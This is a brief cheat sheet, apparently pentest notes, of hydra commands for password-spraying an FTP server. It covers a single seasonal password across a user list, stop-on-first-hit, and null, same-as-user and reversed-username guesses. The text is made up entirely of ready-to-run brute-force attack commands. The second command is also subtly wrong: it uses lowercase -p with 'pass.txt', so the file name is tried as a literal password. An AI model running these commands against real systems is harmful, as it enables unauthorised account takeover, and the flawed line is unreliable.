
Spray to test passwords
```bash
hydra -L users.txt -p 'Spring2026!' -t 4 -W 3 -o spray_pass1.txt ftp://$ip
```
f to exit on hit
```bash
hydra -L users.txt -p pass.txt -f -t 4 -W 3 -o spray_pass1.txt ftp://$ip
```

Null/same-as-user/reversed logins (cheap first pass)
```bash
hydra -L users.txt -P pass.txt -e nsr -t 4 ftp://$ip
```